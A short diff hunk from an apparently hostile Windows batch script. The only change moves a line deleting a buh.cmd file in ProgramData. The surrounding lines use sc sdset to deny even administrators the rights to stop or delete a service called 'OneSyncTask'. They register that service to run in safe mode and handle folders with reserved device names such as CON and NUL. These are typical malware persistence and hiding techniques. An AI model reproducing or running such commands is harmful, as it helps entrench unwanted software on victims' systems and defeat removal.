@@ -20,9 +20,9 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executio
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v Security >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
-del /S /Q %ProgramData%\buh.cmd
 del /S /Q \\?\%ProgramData%\prndata..\nul
 del /S /Q \\?\%ProgramData%\prndata..\con
+del /S /Q %ProgramData%\buh.cmd
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
 rd /S /Q \\.\%ProgramData%\NUL..\
